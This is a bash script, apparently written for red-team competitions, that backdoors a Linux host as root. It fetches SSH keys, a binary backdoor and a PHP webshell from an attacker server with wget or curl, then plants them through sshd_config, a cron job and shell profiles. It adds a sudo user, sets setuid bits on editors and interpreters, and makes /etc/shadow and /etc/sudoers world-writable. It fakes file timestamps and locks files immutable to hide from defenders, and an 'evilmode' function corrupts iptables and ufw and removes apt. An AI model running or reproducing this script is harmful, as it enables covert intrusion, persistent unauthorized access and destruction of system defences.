#!/bin/bash

#CHANGEME name of backdoor (this appears in cron and in bash profiles)
backdoor_name="man-db"
#CHANGEME to where you want your additional authorized_keys file to be stored
hidden_authorized_keys=/etc/ssh/authorized_keys
#CHANGEME to where in the webroot we want to store our shell, and what we want our shell to be called
webshellURL="docs/en/"
webshell="readme.php"
#CHANGEME name/password of added users (i.e. "scorebot" "whiteteam", etc)
username="scorebot"
userpasswd="sup3rs3cr3t"
#CHANGEME to locally hosted webserver address and port
attacker_ip="192.168.23.129"
attacker_port="8081"
#webserver should contain your authorized_keys file, ELF executable, and webshell of choice in the webroot

main()
{
	if [ "$(id -u)" != "0" ]; then
		echo "check ur privs (need to be root). exiting" 1>&2
		exit 1
	fi

	#DETERMINE HOW WE WILL TRANSFER FILES, FETCH FILES, THEN BACKDOOR
	#wget
	wget_location=`command -v wget`
	curl_location=`command -v curl`
	if [[ -f $wget_location ]]
	then
		printf "[+] Using WGET to transfer files\n"
		$wget_location http://$attacker_ip:$attacker_port/authorized_keys -q -O $hidden_authorized_keys
		$wget_location http://$attacker_ip:$attacker_port/backdoor -q -O /etc/cron.hourly/$backdoor_name > /dev/null
		$wget_location http://$attacker_ip:$attacker_port/webshell -q -O /root/$webshell > /dev/null
			getrekt
	elif [[ -f $curl_location ]]
	then 
	#curl
		printf "[+] Using CURL to transfer files"
		$curl_location http://$attacker_ip:$attacker_port/authorized_keys > $hidden_authorized_keys 
		$curl_location http://$attacker_ip:$attacker_port/backdoor > /etc/cron.hourly/$backdoor_name
		$curl_location http://$attacker_ip:$attacker_port/webshell > /root/$webshell
		getrekt
	else
		printf "[+] Error: wget and curl not found. Exiting"
		exit 1
	#TODO FTP
	#TODO SCP
	fi

}

checkDistro()
{
	#determine if we are debian, centos, or fedora
	#debian
	testdebian=`cat /etc/lsb-release`
	testcentos=`rpm --query centos-release`
	testfedora=`cat /etc/fedora-release`
	if [[ $testdebian ]]; then
		return "debian"
		printf "[+] We are on Debian\n"
	elif [[ $testfedora ]]; then
		return "fedora"
		printf "[+] We are on Fedora\n"
	elif [[ $testcentos ]]; then
		return "centos"
		printf "[+] We are on CentOS\n"
	else
		printf "[+] We are on something else\n"
		return "other"
	fi
}

getrekt() {
	distro=checkDistro 
	backdoor1 $distro
	backdoor2 $distro
	backdoor3 $distro
	backdoor4 $distro
	backdoor5 $distro
	backdoor6 $distro
}

#backdoor 1: use our hidden authorized_keys file for authentication
backdoor1() {
	printf "[+] BACKDOORING AUTHORIZED_KEYS\n"
	touch -d "12 Jul 08" $hidden_authorized_keys
	chattr +i $hidden_authorized_keys
	sed -i '/AuthorizedKeysFile/c\AuthorizedKeysFile $hidden_authorized_keys' /etc/ssh/sshd_config
	sed -i '/PermitRootLogin/c\PermitRootLogin yes' /etc/ssh/sshd_config
	chattr +i /etc/ssh/sshd_config
	# maybe AuthorizedKeysCommand to run a backdoor?

	#backdoor #2: cronjob backdoor
	printf "[+] BACKDOORING VIA CRON\n"
	chmod +x /etc/cron.hourly/$backdoor_name
	chown root:root /etc/cron.hourly/$backdoor_name
	chmod +sss /etc/cron.hourly/$backdoor_name
	touch -d "12 Jul 08" /etc/cron.hourly/$backdoor_name
	chattr +i /etc/cron.hourly/$backdoor_name
}

#backdoor #2: user profile backdoor trigger
backdoor2() {
	printf "[+] BACKDOORING BASH PROFILE\n"
	echo "/etc/cron.hourly/$backdoor_name &" >> /root/.bashrc	
	echo "/etc/cron.hourly/$backdoor_name &" >> /etc/profile
#backdoor #4: setuid bit on programs for easy r00tz
	echo "/etc/cron.hourly/$backdoor_name &" >> /etc/skel/.profile
	touch -d "12 Jul 08" /root/.bashrc
	for bashrc in `ls /home/*/.bashrc`; do
		echo "/etc/cron.hourly/$backdoor_name &" >> $bashrc
		touch -d "12 Jul 08" $bashrc 
		chattr +i $bashrc
	done
	touch -d "12 Jul 08" /etc/profile
	touch -d "12 Jul 08" /etc/skel/.profile
	chattr +i /root/.bashrc
	chattr +i /etc/profile
	chattr +i /etc/skel/.profile
}

#backdoor #3: adds a PHP webshell to the specified directory
backdoor3() {
#already done
#backdoor #4: setuid bit on programs for easy r00tz
	printf "[+] BACKDOORING VIA PHP WEBSHELL\n"
	# check if apache is installed
	if [[ `ps aux | grep apache | grep -v grep` -ne 0 ]]; then 
		for webroot in `grep -R "DocumentRoot" /etc/apache2/ | cut -d ":" -f 2 | sed -e 's/^[[:space:]]*//' | cut -d " " -f 2`; do 
		cp /root/$webshell $webroot
		touch -d "12 Jul 08" $webroot/$webshellURL/$webshell
		chattr +i $webroot/$webshellURL/$webshell
		printf "[+] Added file $webroot/$webshellURL/$webshell"
	done
	else 
		printf "[+] Apache wasnt found to be running\n"
	fi
	rm /root/$webshell
}

backdoor4(){
	printf "[+] BACKDOORING VIA SETUID ON BINARIES FOR EASY R00TZ\n"
	if chmod -f +sss `command -v nano` &> /dev/null; then printf "[+] nano setuid bit set\n"; fi
	if chmod -f +sss `command -v vi` &> /dev/null; then printf "[+] vi setuid bit set\n"; fi
	if chmod -f +sss `command -v vim` &> /dev/null; then printf "[+] vim setuid bit set\n"; fi
	if chmod -f +sss `command -v emacs` &> /dev/null; then printf "[+] emacs setuid bit set\n"; fi
	if chmod -f +sss `command -v cat` &> /dev/null; then printf "[+] cat setuid bit set\n"; fi
	if chmod -f +sss /bin/echo; then printf "[+] echo setuid bit set\n"; fi
	if chmod -f +sss `command -v less` &> /dev/null; then printf "[+] less setuid bit set\n"; fi
	if chmod -f +sss `command -v more` &> /dev/null; then printf "[+] more setuid bit set\n"; fi
	if chmod -f +sss `command -v mv` &> /dev/null; then printf "[+] mv setuid bit set\n"; fi
	if chmod -f +sss `command -v cp` &> /dev/null; then printf "[+] cp setuid bit set\n"; fi
	if chmod -f +sss `command -v awk` &> /dev/null; then printf "[+] awk setuid bit set\n"; fi
	if chmod -f +sss `command -v find` &> /dev/null; then printf "[+] find setuid bit set\n"; fi
	if chmod -f +sss `command -v python` &> /dev/null; then printf "[+] python setuid bit set\n"; fi
	if chmod -f +sss `command -v perl` &> /dev/null; then printf "[+] perl setuid bit set\n"; fi
	if chmod -f +sss `command -v ruby` &> /dev/null; then printf "[+] ruby setuid bit set\n"; fi
}

backdoor5(){
	printf "[+] BACKDOOR 5: ADDING A USER\\n"
	useradd $username
	if [[ `command -v sudo` ]]; then
		if ! usermod -aG sudo $username ; then
			echo "$username ALL=(ALL) ALL" >> /etc/sudoers
			printf "[+] No sudo group. Adding $username to sudoers file the bad way\n"
		else
			printf "[+] $username added to sudo group\n"
		fi
	else
		printf "[+] Sudo not installed. Try to escalate via setuid binaries"
	fi
	echo "$username:$userpasswd" | chpasswd
}

backdoor6() {
	printf "[+] BACKDOOR 6: CHMOD 777 EVERYTHING\n"
	if chmod -f 777 /etc/shadow ; then printf "[+] /etc/shadow is now world writeable\n"; fi
	if chmod -f 777 /etc/passwd ; then printf "[+] /etc/passwd is now world writeable\n"; fi
	if chmod -f 777 /etc/group ; then printf "[+] /etc/group is now world writeable\n"; fi
	if chmod -f 777 /etc/sudoers ; then printf "[+] /etc/sudoers is now world writeable\n"; fi
	chmod -Rf 777 /root 
	printf "[+] /root/* is world writeable\n"
	
	#disabling for now. if we store our ssh key in /etc/ nobody can log in due to lax permissions
	#chmod -Rf 777 /etc
	#printf "[+] /etc/* is world writeable\n"
}

doublegetrekt() {
	#backdoor #5: readd backdoors as they are discovered and removed
	printf "[+] Not yet implemented\n"
}

evilmode() {
	#corrupt/uninstall some system binaries that blue team might want to use...
	if dd if=/dev/zero of=/sbin/iptables bs=1 count=1 seek=30000 conv=notrunc ; then printf "[+] iptables corrupted\n"; fi
	if echo '#!/usr/bin/python' > /usr/sbin/ufw && echo 'print("YOU DIDNT SAY THE MAGIC WORD!!!!!!")' >> /usr/sbin/ufw; then printf "[+] ufw corrupted\n"; fi
	if apt-get remove python && apt-get purge python ; then printf "[+] uninstall python"; fi
	if echo "Yes, do as I say!" | apt-get remove apt ; then printf "[+] uninstalled apt"; fi
	
	#set apache webroot to / kek

	#if sed -i 's/a//' /usr/sbin/ufw ; then printf "[+] ufw corrupted\n"; fi


}

main
